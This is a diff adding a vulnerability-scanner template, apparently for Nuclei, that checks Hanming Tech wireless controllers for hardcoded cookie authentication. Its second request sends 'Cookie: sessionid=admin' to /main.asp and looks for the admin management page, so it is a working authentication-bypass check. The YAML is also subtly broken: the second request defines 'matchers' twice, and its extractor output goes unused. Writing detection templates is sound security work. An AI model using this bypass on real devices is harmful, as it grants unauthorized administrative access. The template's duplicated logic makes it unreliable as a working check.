@@ -1,0 +1,54 @@
+id: poc-yaml-hanmingtech-wuxiankongzhiqi-cookie-login
+info:
+  name: 汉明科技 无线控制器 Cookie硬编码访问漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 硬编码凭据
+http:
+  - raw:
+      - |
+        GET /main.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "该登录用户已经不存在"
+          - "window.top.location='/login.asp'"
+        condition: and
+
+  - raw:
+      - |
+        GET /main.asp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sessionid=admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "无线管理系统"
+          - "NewBridge Management System"
+        condition: or
+      - type: word
+        words:
+          - "该登录用户已经不存在"
+          - "window.top.location='/login.asp'"
+        negative: true
+        condition: and
+    extractors:
+      - type: regex
+        regex:
+          - "sessionid=([a-zA-Z0-9]+)"
+        group: 1
+        internal: true
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(http_body, '无线管理系统') || contains(http_body, 'NewBridge Management System')"
